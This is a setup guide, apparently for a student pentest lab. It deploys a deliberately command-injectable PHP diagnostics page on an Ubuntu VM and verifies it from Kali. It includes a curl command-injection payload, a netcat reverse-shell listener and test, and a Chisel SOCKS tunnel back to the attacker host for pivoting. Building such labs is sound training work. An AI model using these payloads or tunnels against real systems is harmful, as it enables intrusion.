# Person B (Web Target Setup) - VM Setup Guide

## 1. Copy the `lab_target` folder to the Ubuntu VM

Example:

```bash
scp -r lab_target user@<ubuntu-ip>:~
```

or simply copy it using VMware Shared Folder / Drag & Drop.

---

## 2. Run the setup script

```bash
cd ~/lab_target
chmod +x setup_diagnostics.sh
sudo ./setup_diagnostics.sh
```

If Ubuntu reports an `initramfs` or "No space left on device" error, ignore it for now if Apache is already installed. The diagnostics page will still be copied correctly.

---

## 3. Verify the diagnostics page

From Kali:

```bash
curl -I http://<ubuntu-ip>/diagnostics.php
```

Expected:

```
HTTP/1.1 200 OK
```

Check the fingerprint:

```bash
curl -s http://<ubuntu-ip>/diagnostics.php | grep -E \
'AutoPentest Lab Diagnostics|name="host"'
```

Expected output:

```
<title>AutoPentest Lab Diagnostics</title>
<input ... name="host" ...>
```

---

## 4. Verify command execution

```bash
curl -s -X POST http://<ubuntu-ip>/diagnostics.php \
--data-urlencode "host=127.0.0.1; printf '%s\n' \$((31001+2001))"
```

Expected output contains:

```
33002
```

---

## 5. Verify reverse-shell payload

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Run the project test:

```bash
cd ~/FYP/project
./test_full_chain.sh <ubuntu-ip> <windows-ip>
```

Expected:

```
Diagnostics endpoint status: 200
Reverse shell connection received
```

---

## 6. Restart the Chisel client (if pivoting)

On Ubuntu:

```bash
./chisel client http://<kali-ip>:8080 R:1080:socks
```

Keep this terminal open.

Verify on Kali:

```bash
ss -ltnp | grep 1080
```

Expected:

```
127.0.0.1:1080
```

---

## Expected Result

The diagnostics page should:

* Return HTTP 200
* Display "AutoPentest Lab Diagnostics"
* Accept the `host` parameter
* Execute the arithmetic validation (`33002`)
* Accept the reverse-shell payload
* Work with the exploitation stage
* Allow pivoting once the Chisel client is connected

**Note:** If the validator still reports **"No private lab target matched the complete fingerprint."**, the issue is in the validator logic, not the web target setup.
